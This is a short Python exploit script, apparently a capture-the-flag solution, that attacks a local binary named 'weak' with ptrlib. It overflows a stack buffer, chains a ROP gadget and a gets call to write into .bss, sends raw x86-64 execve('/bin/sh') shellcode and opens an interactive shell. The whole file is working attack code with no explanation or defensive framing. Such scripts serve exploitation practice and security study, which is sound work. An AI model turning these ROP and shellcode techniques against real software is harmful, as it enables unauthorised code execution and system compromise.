from ptrlib import *

elf = ELF("./weak")
sock = Process("./weak")

shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
plt_gets = 0x400450
ptr_sh = elf.section(".bss") + 0x100
rop_mov_edi_add_rsp = 0x400650

payload = b'A' * 0x18
payload += p64(rop_mov_edi_add_rsp)
payload += p64(0) * (0x30 // 8)
payload += p64(ptr_sh)
payload += p64(plt_gets)
payload += p64(ptr_sh)

sock.recvuntil("president.\n")
sock.sendline(payload)

sock.send(shellcode)

sock.interactive()
